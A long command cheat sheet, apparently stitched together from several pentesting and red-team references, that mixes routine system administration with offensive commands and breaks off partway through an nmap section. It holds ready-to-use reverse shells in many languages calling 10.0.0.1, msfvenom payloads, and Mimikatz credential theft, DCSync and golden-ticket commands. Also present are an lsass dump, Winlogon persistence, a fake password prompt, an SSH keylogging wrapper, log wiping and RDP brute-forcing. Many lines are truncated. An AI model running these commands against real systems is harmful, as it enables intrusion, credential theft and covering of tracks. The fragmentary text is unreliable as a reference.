otool -oV malware_file > malwareMethods.txt
otool -tV malware_file > malwareDisassembly.txt
sudo logs collect <time> --output <file>
cat /System/Library/CoreServices/SystemVersion.plist
networksetup -listallhardwareports
sudo sysdiagnose -f ~/Desktop/
sudo kextstat -l
klist
klist -c <cache>
sudo /usr/bin/profiles status -type enrollment
cat /Library/Receipts/InstallHistory.plist
ls -lart /private/var/db/receipts/
diskutil list
defaults read
defaults read /Library/Preferences/com.apple.Bluetooth
DNS-SD ENUMERATION ON LOCAL NETWORK
dns-sd  -B  _services._dns-sd._udp  local.
dns-sd  -B  _ipp._tcp  local.
dns-sd  -L "Brother HL-L2350DW series" _ipp._tcp local.
dns-sd -Gv4v6 BRW105BAD4B6AD6.local
dns-sd  -B  _smb._tcp  local.
dns-sd  -L "TimeCapsule" _smb._tcp local.
dns-sd -Gv4v6 TimeCapsule.local
dns-sd -B _afpovertcp._tcp
dscl "/Active Directory/<domain>/All Domains" ls /Computers
dscl "/Active Directory/<domain>/All Domains" ls /Users
dscl "/Active Directory/<domain>/All Domains" read
dscl . cat /Users/<username>
dscl . read /Groups/admin
dscl . list /Groups
dscl . list /Users
dscl . list /Users | grep -v '_'
dscacheutil -q group
dscacheutil -q group -a gid 80
dscl -u <ADMIN_USER> -P <PASS> <OD_Server> profilelist
BITFROST (Kerberos on macOS)
bitfrost -action list
bitfrost -action dump -source tickets
bitfrost -action dump -source keytab
bifrost -action askhash -username  lab_admin -domain lab.local -bpassword YWJjMTIzISEh
bifrost -action asktgt -username lab_admin -domain lab.local -bpassword YWJjMTIzISEh
bifrost -action asktgt -username lab_admin -domain lab.local -enctype aes256 -hash
bifrost -action asktgt -username lab_admin -domain lab.local -enctype aes256 -keytab test
bifrost -action describe -ticket doIFIDCCBRygBgIEAA<...snip...>Uw=
bifrost -action asktgs -ticket doIFIDC<...snip...>Uw= -service
bifrost -action asktgs -ticket doIF<...snip...>QUw= -service
bifrost -action ptt -cache new -ticket doI<...snip...>QUw=
sudo dd if=/dev/disk2 of=/path/to/filevault_image.dd
hdiutil attach -imagekey diskimage-class=CRawDiskImage -nomount
sudo fvdetools/fvdeinfo -e EncryptedRoot.plist.wipekey -p blahblah
john --format=FVDE-opencl --wordlist=dict.txt hash.txt
hashcat -a 0 -m 16700 hash.txt dict.txt
sudo ./bin/apfs-dump-quick /dev/sdc1 outfile.txt
sudo ./bin/apfs-dump-quick image.raw outfile.txt
sudo dscl . -create /Users/#{user_name} UniqueID 333
security find-certificate -a -p
Locate Bookmark Database for Firefox & Chrome
find / -path "*/Firefox/Profiles/*/places.sqlite" -exec echo {} >>
find / -path "*/Google/Chrome/*/Bookmarks" -exec echo {} >>
Locate Browser History: Safari, Chrome, Firefox
Prompt User for Password (Local Phishing)
type your password to apply changes." & return & return default answer "" with icon 1 with hidden answer with title "Software
osascript -e 'tell application "Finder" to eject (every disk whose ejectable is true)'
sudo defaults write /Library/Preferences/com.apple.loginwindow
networksetup -setairportnetwork en0 WIFI_SSID WIFI_PASSWORD
networksetup -setairportpower en0 on
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
sudo systemsetup -getremoteappleevents
sudo systemsetup -setremoteappleevents on
sudo systemsetup -setremoteappleevents off
defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool
defaults remove com.apple.NetworkBrowser DisableAirDrop
defaults write com.apple.NetworkBrowser DisableAirDrop -bool YES
sudo launchctl load -F /System/Library/LaunchDaemons/tftp.plist && sudo launchctl start com.apple.tftpd
sudo rm -rf /var/db/RemoteManagement ; sudo defaults delete
defaults delete
sudo rm -r /Library/Application\ Support/Apple/Remote\ Desktop/ ; rm -r ~/Library/Application\ Support/Remote\ Desktop/ ; rm -r ~/Library/Containers/com.apple.RemoteDesktop
MDXFIND / MDXSPLIT
MDXFIND to replicate that hashing series. If not, you can still run
MDXFIND using some of the below 'Generic Attack Plans'. MDXFIND is
cat hash.txt | mdxfind -h <regex #type> -i <#iterations> dict.txt >
mdxfind -h <regex #type> -i <#iterations> -f hash.txt dict.txt >
cat hash.txt | mdxfind -h ALL -h '!salt,!user,!md5x' -i 10 dict.txt
cat hash.txt | mdxfind -h '^md5$,^sha1$,^md5md5pass$,^md5sha1$' -i
cat sha1/*.txt sha256/*.txt md5/*.txt salted/*.txt | mdxfind -Supports 459 different hash types/sequences -Can take input from special 'stdin' mode
cat hashes_out/out_results.txt | mdsplit hashes_orig/hash_orig.txt
cat hashes_out/* | mdsplit hashes_orig/*
cat *.txt | mdxfind -h ALL -h '!salt,!user,!md5x' -i 10 dict.txt | mdsplit *.txt
mdxfind -h ALL -f hashes.txt -i 10 dict.txt | mdsplit hashes.txt
cat dir1/*.txt dir2/*.txt dir3/*.txt | mdxfind -h
msfconsole -r <FILE.rc>
service postgresql Start
msfdb Init
kill <PID>
privilege::debug
sekurlsa::tickets /export
sekurlsa::pth /user:Administrator /domain:winxp
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi
kerberos::golden /admin:administrator /domain:chocolate.local
crypto::capi
crypto::cng
crypto::certificates /export
crypto::keys /export
crypto::keys /machine /export
vault::cred
vault::list
token::elevate
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
lsadump::dcsync /user:domain\krbtgt /domain:lab.local
CRYPTO::Certificates
KERBEROS::Golden
KERBEROS::List
KERBEROS::PTT
LSADUMP::DCSync
LSADUMP::LSA
LSADUMP::Trust
MISC::AddSid
MISC::MemSSP
MISC::Skeleton
SEKURLSA::Ekeys
SEKURLSA::Kerberos
SEKURLSA::Krbtgt
SEKURLSA::Pth
SEKURLSA::Tickets
TOKEN::List
Mimikatz - Execute commands
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
Mimikatz - Extract passwords
reg add
Mimikatz - Pass-The-Hash
sekurlsa::pth /user:<USER> /domain:<DOMAINFQDN>
Mimikatz - Mini Dump
certutil -urlcache -split -f
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords
Mimikatz - Golden ticket
Mimikatz - Skeleton key
misc::skeleton
net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
Mimikatz - RDP session takeover
ts::remote /id:2
net start sesshijack
Mimikatz - Credential Manager & DPAPI
dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*
mimikatz dpapi::cred
mimikatz !sekurlsa::dpapi
Sysmon Event 10 (Process Accessed)
Sysmon Event 1 (ProcessCreate) & Event 10 (ProcessAccessed)
msfvenom -p windows/meterpreter/reverse_tcp
msfvenom -p windows/meterpreter/reverse_http
msfvenom -p
msfvenom -p osx/x86/shell_reverse_tcp
msfvenom -p android/meterpreter/reverse/tcp
msfvenom -p php/meterpreter_reverse_tcp
msfvenom -p java/jsp_shell_reverse_tcp
msfvenom -l encoders
msfvenom -x base.exe -k -p
msfvenom -a x86 --platform OSX -p
msfvenom -p python/meterpreter/reverse_tcp
HEAD / HTTP/1.0
show arp
show interfaces
show ip pim rp
get-metadata.com
Find sites related to a given domain.
Find information about a specific movie. Also
Find news from a certain location in Google News.
apt (deb) Debian,
apt-get install pkg
zypper install pkg
dpkg -i pkg
zypper update -t
apt-get remove pkg
zypper remove pkg
apt-get update
zypper refresh
apt-get upgrade
zypper update
apt-cache search pkg
zypper search pkg
apt-cache search
zypper search -t
zypper wp file
dpkg -l
zypper search -is
zypper repos
zypper addrepo
zypper removerepo
yum (rpm) Fedora
yum install pkg
yum localinstall pkg
yum update pkg
yum erase pkg
yum check-update
yum update
yum list pkg
yum search pattern
rpm -qa
yum repolist
vi /etc/yum.repos.d/
hashcat = Generic representation of the various Hashcat binary
john = Generic representation of the John the Ripper binary names
hashcat -b
hashcat -a 0 -m 0 -w 4 hash.txt custom_list.txt
hashcat -a 0 -m 0 -w 4 hash.txt custom_list.txt -r best64.rule --loopback
hashcat -a 0 -m 0 -w 4 hash.txt dict.txt
hashcat -a 0 -m 0 -w 4 hash.txt dict.txt -r best64.rule --loopback
awk -F ":" '{print $2}' hashcat.potfile >> custom_list.txt
hashcat -a 0 -m 0 -w 4 hash.txt custom_list.txt -r dive.rule --loopback
hashcat -a 3 -m 0 -w 4 hash.txt rockyou-1-60.hcmask
hashcat -a 6 -m 0 -w 4 hash.txt dict.txt rockyou-1-60.hcmask
hashcat -a 7 -m 0 -w 4 hash.txt rockyou-1-60.hcmask dict.txt
hashcat -a 1 -m 0 -w 4 hash.txt dict.txt dict.txt
hashcat -a 6 -m 0 -w 4 hash.txt custom_list.txt rockyou-1-60.hcmask
hashcat -a 7 -m 0 -w 4 hash.txt rockyou-1-60.hcmask custom_list.txt
hashcat -a 3 -m 0 -w 4 hash.txt custom_masks.hcmask
hashcat -a 3 -m 0 -w 4 hash.txt -i ?a?a?a?a?a?a?a?a
service puppetserver start
chkconfig puppetserver on
chkconfig puppet on
puppet cert list
puppet cert list --all
puppet cert sign <name>
puppet cert sign --all
puppet cert clean <name>
puppet node clean <name>
puppet module list
puppet module install <name>
puppet module uninstall <name>
puppet module upgrade <name>
puppet module search <name>
puppet agent --test                  run puppet agent on demand
puppet agent --disable                disabled puppet agent
puppet agent --enable                 enable puppet agent
puppet agent --configprint config
puppet agent -t --noop
puppet agent --configprint
vi /etc/hosts
nslookup puppet.example.com
vi /etc/resolv.conf
service network restart
puppet master
puppet cert clean node.example.com   clean node (Master)
puppet agent --test                  run puppet agent (Node)
last new
Responder listens on ports: UDP 53,137,138,389,1434 TCP
python Responder.py -I <interface>
hostname e.g, SQLSERVER-01, FILESHARE02,…
python Responder.py -I <interface> -A
python RunFinger.py -i 10.X.X.0/24
python MultiRelay.py -t <Target IP> -u ALL
launchctl unload
launchctl unload /System/Library/LaunchDaemons/com.apple.smbd.plist
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
sh -i >& /dev/udp/10.0.0.1/4242 0>&1
chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~- >fdopen($c,w);system$_ while<>;'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~- >fdopen($c,w);system$_ while<>;'
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen( cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin /sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f
strings reverse.war | grep jsp # in order to get the name of the
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c "__import__('pty').spawn('/bin/bash')"
python3 -c "__import__('subprocess').call(['/bin/bash'])"
perl -e 'exec "/bin/sh";'
perl -e 'print `/bin/bash`'
shodan init YOUR_API_KEY
shodan info
shodan myip
shodan host <IPAddress>
shodan count <search string>
shodan count WebBox
shodan stats --facets <facet> <string> country:<##>
shodan stats --facets http.component apache country:CN
shodan search --fields ip_str,port,org,hostnames <string> | tee
shodan search --fields ip_str,port,org,hostnames <string>
shodan download <outfile> <search query>
shodan download Microsoft-data Microsoft iis 6.0
shodan scan submit --filename scan_results.txt <IPAddress or
shodan stream --datadir /dir/path/results
shodan stream --ports 80,443,3389
shodan alert create "Scan results" <IP/CIDR>
shodan stream --alert=<Alert ID> --datadir=scan-results/
shodan scan internet <port> <protocol>
shodan domain example.com -D
hostname = find matching device hostname; server:"gws"
Find websites that are clones by searching in the "Raw Data View"
sort -cluster_count | head 20}}|| Cluster events together,
./sqlmap.py -r post-request.txt -p uname
sshpass -p '<your-passwd>' ssh
apt-get install openssh, apt-get install
service sshd restart, systemctl reload
sshuttle -r kubo@10.92.21.17 30.0.0.0/16
chmod 600 ~/.ssh/id_rsa
chmod 700 ~/.ssh, chown -R $USER:$USER
chmod 644 ~/.ssh/authorized_keys
sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/g'
sed -i 's/^PermitRootLogin yes/#PermitRootLogin yes/'
grep -R "ssh.*Received signal 15"
grep -R "sshd.*Server listening"
grep -R "sshd.*Failed password for invalid user" /var/log/auth.log
grep -R "sshd.*POSSIBLE BREAK-IN ATTEMPT!" /var/log/auth.log
grep -R "sshd.*Bad protocol version identification" /var/log/auth.log
grep -R "sshd.*Accepted publickey for"
grep -R "sshd.*Accepted password for"
grep -R "sshd.*pam_unix(sshd:session): session closed for" /var/log/auth.log
sshpass sshpass -p "$PASSWORD" ssh -o
echo 1 > /proc/sys/net/ipv4/ip_forward
strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" |
echo '$PATH=~/.local/bin:$PATH' >>~/.profile
mkdir -p ~/.local/bin ~/.ssh/logs
cat >~/.local/bin/ssh
strace -e trace=read -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh $@
cat ~/.local/bin/ssh-log
echo -n "${x}"
chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
tmux new -s example
tmux kill-ses -t example
tmux kill-ses -a
tmux kill-ses -a -t
tmux ls
tmux a
tmux a -t example
tmux new -s example -n
tmux info
Invoke-UserSimulator
Invoke-ADLabDeployer
vol.py -f image--profile=profileplugin
vol.py -f mem.img timeliner --output-
vol.py -f mem.img imageinfo
vol.py apihooks
Find API/DLL function
vol.py autoruns -v
vol.py cmdscan
vol.py consoles
vol.py dlldump --dump-dir ./output -r
vol.py dlllist -p ###
vol.py driverirp -r tcpip
vol.py dumpfiles-n -i -r \\.exe --dump-
vol.py dumpregistry--dump-dir ./output
vol.py filescan
vol.py getsids -p ###
vol.py handles -p ### -t File,Key
vol.py hashdump
vol.py hivedump -o 0xe1a14b60
vol.py hivelist
vol.py hollowfind-D ./output_dir
vol.py idt
vol.py imagecopy -f hiberfil.sys -O
vol.py imagecopy -f MEMORY.DMP -O
vol.py ldrmodules -p ### -v
vol.py malfind --dump-dir ./output_dir
vol.py memdump --dump-dir ./output -p
vol.py moddump --dump-dir ./output -r
vol.py modscan
vol.py netscan
vol.py procdump --dump-dir ./output -p
vol.py pslist
vol.py pstree
vol.py psxview
vol.py ssdt
vol.py svcscan-v
vol.py userassist
dirsearch -u example.com -e sh,txt,htm,php,cgi,html,pl,bak,old
dirsearch -u example.com -e sh,txt,htm,php,cgi,html,pl,bak,old -w
type definitions from remote or local locations. Several attack
dd if=/dev/zero bs=1M count=1024 | gzip > zeros.gz
dd if=/dev/zero bs=1M count=1024 | lzma -z > zeros.xy
ls -sh zeros.*
Show ARP table with
cmdkey /list
dir /b /s <Directory>\<FileName>
dism /online /disable-feature
dism /online /Enable-Feature
dism /online /get-features | more
for /F %i in ([file-set]) do [command]
for /L %i in ([start],[step],[stop]) do
Show IP configuration
net accounts /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
net group /domain
net localgroup "Administrators"
net localgroup "Administrators" user /add
net share
net share \\<IP>
net share cshare C:\<share>
net time \\<IP>
net use \\<IP>\ipc$ "" "/user:"
net use \\<IP>\ipc$ <PASS> /user:<USER>
net use r: \\<IP>\ipc$ <PASS>
net user /domain
net user <USER> <PASS> /add
net view /domain
net view /domain:<DOMAIN>
nslookup -type=any example.com
nslookup -type=ns example.com
nslookup <IP>
nslookup <IP> <NAMESERVER>
nslookup example.com
psexec /accepteula \\<IP> -c
psexec /accepteula \\<IP> -i -s
psexec /accepteula \\<IP> -s
psexec /accepteula \\<IP> -s cmd.exe
psexec /accepteula \\<IP> -u
dir c:\file.exe
psexec /accepteula \\<IP> hostname
psexec /accepteula \\<IP1>,<IP2>,<IP3>
reg add \\<IP>\<RegDomain>\<Key>
reg export <RegDomain>\<Key>
Robocopy /ipg:750 /z /tee \\<IP>\<SHARE>
Robocopy directory
Robocopy <source> <destination> [file…]
Robocopy C:\UserDir C:\DirBackup /E
runas /user:<USER> "file.exe [args]"
sc \\<IP> create <SERVICE>
SC create a remote
sc \\<IP> create <SERVICE> binpath=
sc query
sc query \\<IP>
sc query \\<IP> <ServiceName>
sc query <ServiceName>
sc query state=all
systeminfo /S <IP> /U <DOMAIN\USER> /P
taskkill /PID ## /F
tasklist /m
tasklist /S <IP> /v
tasklist /svc
ver
wmic <alias> <where> <verb>
wmic /node:<IP> /user:<User>
wmic /node:<IP> process call create
wmic /node:<IP> computersystem get
wmic logicaldisk list brief
wmic ntdomain list
wmic process call create C:\<process>
wmic process list full
wmic qfe
wmic startupwmic service
xcopy /s \\<IP>\<dir> C:\<LocalDir>
Out-File - FilePAth
Clear-Host
Compare-Object
Copy-Item
get-childitem C:\Users -Force | select Name
get-command
Get-Content
get-eventlog -list
get-executionpolicy
get-help -name <Command>
get-history
get-localgroup | ft Name
get-localgroupmember
get-localuser | ft Name,
Get-Process
get-process <PID1>, <PID2> | format-list *
get-service
get-service | Where-Object
get-uptime
get-winevent -list
Group-Object
Groups objects that contain the
Measure-Object
Move-Item
New-Item
Remove-Item
Resolve-Path
Resume-Job
Set-Content
set-executionpolicy -ExecutionPolicy
Set-Item
Set-Location
Set-Variable
Sort-Object
Start-Job
Start-Process
Start-Service
stop-process -name "notepad"
Suspend-Job
Wait-Job
wevtutil el | Foreach-Object
wevutil el
Where-Object
Write-Output
Find Serial # and then look for "Friendly Name" to obtain the
Sysmon service state changed
Sysmon config state changed
bash.exe -c example.exe
bitsadmin /CREATE 1 & bitsadmin /ADDFILE 1
rundll32.exe zipfldr.dll,RouteTheCall example.exe
bitsadmin /CREATE 1 bitsadmin /ADDFILE 1
esentutl.exe /y C:\path\dir\src_example.vbs /d
expand c:\path\dir\src_example.bat c:\path\dir\dst_example.bat
certutil -encode input_example.txt encoded_example.txt
certutil -decode encoded_example.txt output_example.txt
rundll32.exe dfshim.dll,ShOpenVerbApplication
regsvr32.exe /s /u /i:file.sct scrobj.dll
csc.exe -out:example.exe file.cs
csc.exe -target:library -out:example.dll file.cs
jsc.exe scriptfile.js
dir \\<Responder_IPAddr>\C$
regsvr32 /s /u /i://<Responder_IPAddr>/blah example.dll
echo 1 > //<Responder_IPAddr>/blah
pushd \\<Responder_IPAddr>\C$\blah
cmd /k \\<Responder_IPAddr>\C$\blah
cmd /c \\<Responder_IPAddr>\C$\blah
start \\<Responder_IPAddr>\C$\blah
mkdir \\<Responder_IPAddr>\C$\blah
type \\<Responder_IPAddr>\C$\blah
rundll32.exe comsvcs.dll #24 "<PID> lsass.dmp full"
Groups on Target System
net localgroup
Get-LocalGroup | ft Name
net localgroup Administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
Get-ItemProperty -Path
dir C:\Users\username\AppData\Local\Microsoft\Credentials dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | %
tasklist /v
net start
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle,
wmic service get name,displayname,pathname,startmode 2>nul |findstr
gwmi -class Win32_Service -Property Name, DisplayName, PathName,
schtasks /query /fo LIST 2>nul | findstr TaskName
dir C:\windows\tasks
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
Get-CimInstance Win32_StartupCommand | select Name, command,
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
Get-NetIPConfiguration | ft
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
Get-NetRoute -AddressFamily IPv4 | ft
Get-NetNeighbor -AddressFamily IPv4 | ft
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml
dir C:\Users\<USER>\ /s *pass* == *vnc* == *.config* 2>nul
findstr C:\Users\ /si password *.xml *.ini *.txt *.config 2>nul
Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
Get-ChildItem -Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1
systeminfo > systeminfo.txt
systeminfo.exe /S MyRemoteHost > systeminfo.txt
Import-Module Privesc
Invoke-AllChecks
net user /domain > users.txt
echo "password1" >> passwords.txt
echo "Spring2020" >> passwords.txt
XFREERDP -Simple User Enumeration Windows Target (kerberos based)
xfreerdp /v:172.24.0.32 -sec-nla /u:""
XFREERDP - Login
xfreerdp /u:<USERNAME> /g:<RD_GATEWAY> /p:<PASS> /v:172.24.1.34
ncrack -vv --user/-U <username_wordlist> --pass/-P
ncrack -vv --user <USERNAME> -P wordlist.txt -s 172.24.0.32:3389
crowbar.py -b rdp -U user/user_wordlist> -C
crowbar.py -b rdp -u user -C password_wordlist -s <target_ip>/32 -v
crowbar.py -b rdp -u <DOMAIN>\\<USER> -c <PASS> -s 10.68.35.150/32
sc create newservice type= own type= interact binPath=
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, payload.exe"
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, payload.exe" -Force
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, payload.exe" /f
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, payload.exe" -Force
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
cmd.exe /k < \\webdavserver\folder\batchfile.txt
cscript //E:jscript \\webdavserver\folder\payload.txt
mshta \\webdavserver\folder\payload.hta
rundll32 \\webdavserver\folder\payload.dll,entrypoint
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
Groups - Default
Groups Names User or
History - Days to
History /DaysToKeep
Last Defrag
Last Theme
del %WINDIR%\*.log /a /s /q /f
for /f %a in ('wevtutil el') do @wevtutil cl "%a"
wevtutil el
wevtutil cl [LOGNAME]
wevtutil el | Foreach-Object {wevtutil cl "$_"}
$files =  Get-ChildItem -force | Where-Object {! $_.PSIsContainer}
host 172.24.1.1
```

### L1_Serial_OOB (1 commands)
```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

### L2_ARP_Link (2 commands)
```bash
iwlist <wlan#> scan
arp -a
```

### L3_Routing_NAT (85 commands)
```bash
iptables -F
iptables -n -L -v --line-numbers
iptables -P INPUT <DROP/ACCEPT/REJECT>
iptables -P OUTPUT <DROP/ACCEPT/REJECT>
iptables -P FORWARD <DROP/ACCEPT/REJECT>
iptables -L <INPUT/OUTPUT/FORWARD>
iptables -A INPUT -s 10.0.0.10 -j <ACCEPT/DROP/REJECT>
iptables -A OUTPUT -d 10.0.0.10 -j <ACCEPT/DROP/REJECT>
iptables -A OUTPUT -p tcp -d example.com -j DROP
iptables -D INPUT -s 10.0.0.10 -p tcp -dport 80 -j ACCEPT
iptables -D OUTPUT -d 10.0.0.10 -p tcp -dport 80 -j ACCEPT
iptables -D <INPUT/OUTPUT/FORWARD> 5
iptables -I INPUT 3 -s 10.0.0.10 -j DROP
iptables -I OUTPUT 2 -d 10.0.0.10 -j ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j
iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT
ifconfig <eth#> <IP>/<CIDR>
route add default gw <IP>
ping -c 3 host
ping -c 3 host  or IP and output
ifconfig -a
Traceroute network tracking
ifconfig -a | grep -Po '\b(?!255)(?:\d{1,3}\.){3}(?!255)\d{1,3}\b'
ipconfig
route add <SUBNET> <MASK>
route add 172.24.0.0/24
route add 172.24.0.0/24 -d
ping -c 3 ip_address
ping -c 3 ip_addres
ping -c 3 ip_addr
traceroute  ip_
tracert  ip_a
nft -f files/nftables/ipv4-filter
nft list table filter
nft add rule ip filter output  ip daddr 1.2.3.4 drop
nft add rule ip filter output  ip daddr 1.2.3.4 counter drop
nft add rule ip filter output ip daddr 172.24.1.0/24 counter
nft add rule ip filter input tcp dport 80 drop
nft add rule  filter input icmp type echo-request accept
nft add rule ip filter output ip protocol icmp  ip daddr 1.2.3.4
nft delete rule filter output
nft list table filter -a
nft delete rule filter output handle 10
nft flush table filter
nft insert rule filter input tcp dport 80 counter accept
nft list table filter -n  -a
nft  add rule filter output position 8 ip daddr 127.0.0.8 drop
nft list table filter -n -a
nft insert rule filter output position 8 ip daddr 127.0.0.12 drop
nft insert rule filter output ip  protocol tcp counter
nft -f files/nftables/ipv6-filter
nft add rule ip6 filter output ip6 daddr home.regit.org counter
nft list table ip6 filter
nft add rule ip6 filter input icmpv6 type nd-neighbor-solicit
nft add rule ip6 filter input icmpv6 type nd-router-advert accept
nft insert rule filter input ct state established accept
nft insert rule filter output oif lo accept
nft insert rule filter input iif eth2 accept
IP address
ping -c 3 <IP>
ping -c 3 puppet
ping -c 3 puppet.example.com
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
route add -net 10.0.0.0/16 gw 1.1.1.1
IP Address
IP address of the user
ipconfig /all
ipconfig /displaydns
netsh firewall set opmode disable
netsh interface ip set address local dhcp
netsh interface ip set address local
netsh interface ip set dns local static
netsh interface ip show interfaces
netsh wlan export profile key=clear
netsh wlan show profiles
route print
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all
netsh dump
netsh firewall add allowedprogram C:\payload.exe MyPayload ENABLE
netsh firewall add portopening TCP 1234 MyPayload ENABLE ALL
netsh firewall delete portopening TCP 1234
```

### L4_Port_Service (163 commands)
```bash
ssh-keygen -t rsa -b 4096
ssh [target] [user] [password]
nbtstat -A <IP> or <CIDR>
netstat -ant
netstat -anu
scp -r user@host:dir dir
scp file user@host:dir
scp user@host:file dir
ssh -p port user@host
ssh user@host
ssh-copy-id user@host
netstat -apetul
netstat -plan
netstat -plant
ss -l
ss -ta
ss -tp
ssh root@<IP/HOST> tcpdump -i any -U -s 0 -w - 'not port 22'
Telnet protocol extension
Telnet over Secure Sockets
ncat -k -l -p 4444 | tee files.b64
nc -lvp 1234
netstat -tn 2>/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1
nc -nvz <IP> <PORT/RANGE>
nc -nvz 172.24.1.23 80
nc -nvz 172.24.1.23 0-1000
nc -lvp <LPORT> > example_sent.txt
nc -w3 <CLIENT_IP> <PORT> < example.txt
nc -lvp <LPORT> < example.txt
nc -w3 <SERVER_IP> <PORT> > example_exfil.txt
nc -lvp <LPORT> -e ping.sh <IP>
nc -nv <SERVER_IP> <PORT>
ncat -nlvp <LPORT> --ssl
ncat -nv <SERVER_IP> <PORT>
nc <TARGET_IP> <PORT>
nc www.netmux.com 80
nc -e /bin/sh 10.0.0.1 <LPORT>
nc -e /bin/bash 10.0.0.1 <LPORT>
nc -c bash 10.0.0.1 <LPORT>
nmap 10.0.0.1
nmap 10.0.0.1-20
nmap 10.0.0.0/24
nmap -iL list-of-ips.txt
nmap -p 22 10.0.0.1
nmap -p 1-100 10.0.0.1
nmap -F 10.0.0.1
nmap -p- 10.0.0.1
nmap -sT 10.0.0.1
nmap -sS 10.0.0.1
nmap -sU -p 123,161,162 10.0.0.1
nmap -Pn -F 10.0.0.1
